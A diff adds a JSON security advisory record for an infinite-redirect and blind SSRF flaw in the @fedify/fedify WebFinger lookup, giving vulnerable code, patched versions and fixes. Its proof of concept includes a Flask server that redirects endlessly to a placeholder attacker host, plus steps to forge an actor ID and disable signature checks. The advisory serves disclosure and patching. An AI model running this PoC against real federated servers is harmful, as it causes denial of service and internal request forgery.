@@ -1,0 +1,80 @@
+{
+  "Severity": "MODERATE",
+  "UpdatedAt": "2025-01-21T19:58:30Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "@fedify/fedify"
+  },
+  "Advisory": {
+    "DatabaseId": 277039,
+    "Id": "GSA_kwCzR0hTQS1jNTlwLXdxNjctMjR3eM4ABDov",
+    "GhsaId": "GHSA-c59p-wq67-24wx",
+    "References": [
+      {
+        "Url": "https://github.com/dahlia/fedify/security/advisories/GHSA-c59p-wq67-24wx"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2025-23221"
+      },
+      {
+        "Url": "https://github.com/dahlia/fedify/commit/8be3c2038eebf4ae12481683a1e809b314be3151"
+      },
+      {
+        "Url": "https://github.com/dahlia/fedify/commit/c505eb82fcd6b5b17174c6659c29721bc801ab9a"
+      },
+      {
+        "Url": "https://github.com/dahlia/fedify/commit/e921134dd5097586e4563ea80b9e8d1b5460a645"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-c59p-wq67-24wx"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-c59p-wq67-24wx"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2025-23221"
+      }
+    ],
+    "Description": "### Summary\nThis vulnerability allows a user to maneuver the Webfinger mechanism to perform a GET request to any internal resource on any Host, Port, URL combination regardless of present security mechanisms, and forcing the victim’s server into an infinite loop causing Denial of Service.\nMoreover, this issue can also be maneuvered into performing a Blind SSRF attack.\n\n### Details\nThe Webfinger endpoint takes a remote domain for checking accounts as a feature, however, as per the ActivityPub spec (https://www.w3.org/TR/activitypub/#security-considerations), on the security considerations section at B.3, access to Localhost services should be prevented while running in production.\n\nThe **lookupWebFinger** function, responsible for returning an actor handler for received actor objects from a remote server, can be abused to perform a Denial of Service (DoS) and Blind SSRF attacks while attempting to resolve a malicious actor’s object.\nOn Fedify, two client-facing functions implement the **lookupWebFinger** function- **getActorHandle**, and **lookupObject**, which are both used as a wrapper for the vulnerable lookup function.\nAs the **lookupObject** function is implemented only for CLI usage, we won’t focus our PoC and explanation on it, but it is still vulnerable in the same way **getActorHandle** is.\n\nThe **getActorHandle** function is a wrapper function for the **getActorHandleInternal** function (both present at _/src/vocab/actor.ts_):\n```javascript\nasync function getActorHandleInternal(\n  actor: Actor | URL,\n  options: GetActorHandleOptions = {},\n): Promise\u003c`@${string}@${string}` | `${string}@${string}`\u003e {\n  const actorId = actor instanceof URL ? actor : actor.id;\n  if (actorId != null) {\n    const result = await lookupWebFinger(actorId, {\n      userAgent: options.userAgent,\n      tracerProvider: options.tracerProvider,\n    });\n    if (result != null) {\n      const aliases = [...(result.aliases ?? [])];\n      if (result.subject != null) aliases.unshift(result.subject);\n      for (const alias of aliases) {\n        const match = alias.match(/^acct:([^@]+)@([^@]+)$/);\n        if (match != null) {\n          const hostname = new URL(`https://${match[2]}/`).hostname;\n          if (\n            hostname !== actorId.hostname \u0026\u0026\n            !await verifyCrossOriginActorHandle(\n              actorId.href,\n              alias,\n              options.userAgent,\n              options.tracerProvider,\n            )\n          ) {\n            continue;\n          }\n          return normalizeActorHandle(`@${match[1]}@${match[2]}`, options);\n        }\n      }\n    }\n  }\n  if (\n    !(actor instanceof URL) \u0026\u0026 actor.preferredUsername != null \u0026\u0026\n    actor.id != null\n  ) {\n    return normalizeActorHandle(\n      `@${actor.preferredUsername}@${actor.id.host}`,\n      options,\n    );\n  }\n  throw new TypeError(\n    \"Actor does not have enough information to get the handle.\",\n  );\n}\n```\n\nThe **actorId** parameter containing a URL of the actor ID sinks into the **lookupWebFinger** function which is a wrapper for the **lookupWebFingerInternal**:\n```javascript\nasync function lookupWebFingerInternal(\n  resource: URL | string,\n  options: LookupWebFingerOptions = {},\n): Promise\u003cResourceDescriptor | null\u003e {\n  if (typeof resource === \"string\") resource = new URL(resource);\n  let protocol = \"https:\";\n  let server: string;\n  if (resource.protocol === \"acct:\") {\n    const atPos = resource.pathname.lastIndexOf(\"@\");\n    if (atPos \u003c 0) return null;\n    server = resource.pathname.substring(atPos + 1);\n    if (server === \"\") return null;\n  } else {\n    protocol = resource.protocol;\n    server = resource.host;\n  }\n  let url = new URL(`${protocol}//${server}/.well-known/webfinger`);\n  url.searchParams.set(\"resource\", resource.href);\n  while (true) {\n    logger.debug(\n      \"Fetching WebFinger resource descriptor from {url}...\",\n      { url: url.href },\n    );\n    let response: Response;\n    try {\n      response = await fetch(url, {\n        headers: {\n          Accept: \"application/jrd+json\",\n          \"User-Agent\": typeof options.userAgent === \"string\"\n            ? options.userAgent\n            : getUserAgent(options.userAgent),\n        },\n        redirect: \"manual\",\n      });\n    } catch (error) {\n      logger.debug(\n        \"Failed to fetch WebFinger resource descriptor: {error}\",\n        { url: url.href, error },\n      );\n      return null;\n    }\n    if (\n      response.status \u003e= 300 \u0026\u0026 response.status \u003c 400 \u0026\u0026\n      response.headers.has(\"Location\")\n    ) {\n      url = new URL(\n        response.headers.get(\"Location\")!,\n        response.url == null || response.url === \"\" ? url : response.url,\n      );\n      continue;\n    }\n    if (!response.ok) {\n      logger.debug(\n        \"Failed to fetch WebFinger resource descriptor: {status} {statusText}.\",\n        {\n          url: url.href,\n          status: response.status,\n          statusText: response.statusText,\n        },\n      );\n      return null;\n    }\n    try {\n      return await response.json() as ResourceDescriptor;\n    } catch (e) {\n      if (e instanceof SyntaxError) {\n        logger.debug(\n          \"Failed to parse WebFinger resource descriptor as JSON: {error}\",\n          { error: e },\n        );\n        return null;\n      }\n      throw e;\n    }\n  }\n}\n```\n\nThe function takes the **actorId** parameter containing the actor ID URL, extracts the scheme and uses the rest of the URL (host+port+path) directly inside a hard-coded Webfinger URL address which in turn sinks into a fetch request.\n\nOn the fetch request, the **redirect** attribute is set to “**manual**” preventing automated redirects. However, redirects are still handled using custom code that loops over responses and re-fetching the URL found inside the “Location” header until receiving a valid response or an error occurs (loop keeps until 300\u003estatus code\u003e400).\n\nThis custom redirect implementation contains multiple issues:\n1.The redirect loop is endless ( while(true) loop ) without any iteration limiting, allowing attackers to perform DoS via endless redirecting.\n2. A Blind SSRF attack to any URL, with arbitrary Host, Port and Path is possible via the current custom redirect implementation.\n3. As the redirect handler is a custom one, it breaches the security mechanisms presented by the native redirect handler of fetch - allowing the attacker to redirect to different schemes such as data or file schemes.\n\nIn order to successfully perform any of the attacks described above, an attacker needs to create a federated app which presents a malicious actor object, containing an actor ID URL of a second server which performs a recursive redirect to itself, or a URL containing an internal resource.\n\n\n### PoC\n1. In order to show a use case of the vulnerability, we can use the demo app presented at this URL: https://github.com/dahlia/microblog.\n2. We will create two machines, victim and attacker, each one on a different server with different domains.\n\n**_Victim Machine_**\n1. Create a new instance (we tested on ubuntu’s latest version), and update the package manager.\n2. Install a Deno server:\n`\ncurl -fsSL https://deno.land/install.sh | sh\n`\n`\nsource ~/.bashrc\n`\n`\ndeno --version #check deno is working\n`\n3. Pull the git repository of the victim blog app:\n`\ngit clone https://github.com/dahlia/fedify.git\n`\n4. Modify the federation object to remove signature checks for the sake of easy testing:\nOn file **_/examples/blog/federation/mod.ts_** edit the **_createFederation\u003cvoid\u003e_** object the following attribute: **_skipSignatureVerification: true_**.\n5. Change into the blog app directory ( /examples/blog ) and run the app:\n`\ndeno task preview\n`\n6. Surf to the application on the browser, and register a user on the app.\n\n**_Attacker Machine_**\n1. Create a new instance (we tested on ubuntu’s latest version), and update the package manager.\n2. Install NVM in order to install the latest version of NPM and NODEJS (and source current shell to check it worked):\n`\ncurl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash\n`\n`\nsource ~/.bashrc\n`\n`\nnvm list-remote\n`\n3. Install the latest stable version:\n`\nnvm install {latest_ver} #for example: v20.10.0\n`\n`\nsource ~/.bashrc\n`\n`\nnpm -v #check it works\n`\n`\nnode -v #check it works\n`\n4. Download the attacker app repository:\n`\ngit clone https://github.com/dahlia/microblog.git\n`\n5. Disable request signature validations:\nEdit the **_/src/federation.ts_** file and add a **_skipSignatureVerification: true_** attribute to the **_createFederation_** object.\n6. Modify the **_/src/federation.ts_** file and tamper with the Person object on the actor dispatcher ( **_setActorDispatcher(\"/users/{identifier}\"_** ) - change the actor ID attribute **_“id: ctx.getActorUri(identifier)_**” into “**_id: new URL(‘http://\u003cATTACKER_MACHINE_DOMAIN\u003e:1337/users/enterloop’)_**”.\n7. Install python flask and create the Python Flask redirect server:\n`\napt update\n`\n`\napt install python3-flask\n`\n```python\nfrom flask import Flask, redirect\n\napp = Flask(__name__)\n\n@app.route('/health')\ndef health():\n    return \"hello\", 200\n\n@app.route('/.well-known/webfinger')\ndef ssrfinger():\n    return redirect(\"http://\u003cATTACKER_MACHINE_DOMAIN\u003e:1337/endlessloop\")\n\n@app.route('/endlessloop')\ndef endlessloop():\n    return redirect(\"http://\u003cATTACKER_MACHINE_DOMAIN\u003e:1337/endlessloop\")\n\nif __name__ == '__main__':\n    app.run(debug=True,host='0.0.0.0' ,port=1337)\n```\n8.  Run the python server and attempt to reach the “**_/health_**” path to see the server functions as expected.\n9. Read the **_README.txt_** file on the attacker app and follow the instructions on how to execute the app.\n10. Surf the app on the browser and attempt to follow the federated user on the victim’s machine.\n11. Send the “follow” request and watch the victim app continue to query the redirect server infinitely (It is possible to repeat this step multiple times causing multiple loops).\n\n\n### Impact\n1. Implement a limiting stop condition for the endless loop to prevent infinite loops.\n2. Validate the scheme while performing a manual redirection handler.\n3. For each web resource (for the **_lookupWebFinger_** function and also URLs found on the “**_Location_**” header inside the loop) use the “**_validatePublicUrl_**” function to verify that it is not targeting a local resource.\n",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2025-01-21T19:58:29Z",
+    "Severity": "MODERATE",
+    "Summary": "Infinite loop and Blind SSRF found inside the Webfinger mechanism in @fedify/fedify",
+    "UpdatedAt": "2025-01-21T19:58:30Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 5.4,
+      "VectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:N/A:L"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "1.3.4"
+      },
+      "VulnerableVersionRange": "= 1.3.3"
+    },
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "1.2.11"
+      },
+      "VulnerableVersionRange": "= 1.2.10"
+    },
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "1.1.11"
+      },
+      "VulnerableVersionRange": "= 1.1.10"
+    },
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "1.0.14"
+      },
+      "VulnerableVersionRange": "= 1.0.13"
+    }
+  ]
+}
